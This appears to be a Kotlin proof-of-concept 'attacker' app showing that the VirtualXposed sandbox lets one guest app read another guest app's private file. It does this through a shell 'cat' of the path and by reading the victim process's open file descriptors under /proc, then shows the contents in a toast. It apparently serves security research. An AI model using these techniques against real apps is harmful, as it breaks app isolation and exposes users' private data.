package com.virtualxposed.guestattacker

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Context
import android.content.Context.ACTIVITY_SERVICE
import android.widget.Toast
import androidx.annotation.UiThread
import com.virtualxposed.guestattacker.Utils.executeShellCommand
import com.virtualxposed.guestattacker.Utils.getOpenFileDescriptors
import com.virtualxposed.guestattacker.Utils.log
import com.virtualxposed.guestattacker.Utils.toast
import java.io.File

object StorageBypass {
    // io.va.exposed64 for host app
    const val victimApp = "com.virtualxposed.victim"

    @SuppressLint("SdCardPath")
    val victimFile =
        File("/data/data/io.va.exposed64/virtual/data/user/0/com.virtualxposed.victim/files/private-file")

    fun shellBypass(context: Context) {
        val results = executeShellCommand("cat ${victimFile.absolutePath}")
        log("Private file results: $results")
        toast(context, "Victim file: $results")
    }

    fun fdBypass(context: Context) {
        val activityManager = context.getSystemService(ACTIVITY_SERVICE) as ActivityManager
        val procInfos = activityManager.runningAppProcesses

        val victimProcesses = procInfos.filter { it.processName == victimApp }

        victimProcesses.firstOrNull { victimProcess ->
            val fileDescriptors = getOpenFileDescriptors(victimProcess.pid)
            fileDescriptors.forEach { fd ->
                val fdPath = "/proc/${fd.pid}/fd/${fd.fdNumber}"
                log("File descriptor $fdPath: ${fd.targetPath}")

                if (fd.targetPath == victimFile.absolutePath) {
                    log("Got victim file descriptor ${fd.targetPath}")
                    val result = File(fdPath).readText()
                    Toast.makeText(
                        context,
                        "Private file results: $result",
                        Toast.LENGTH_LONG
                    ).show()
                    return@firstOrNull true
                }
            }
            false
        }.also { results ->
            if (results == null) {
                toast(
                    context,
                    "No file descriptor found to access the victim app",
                )
            }
        }
    }
}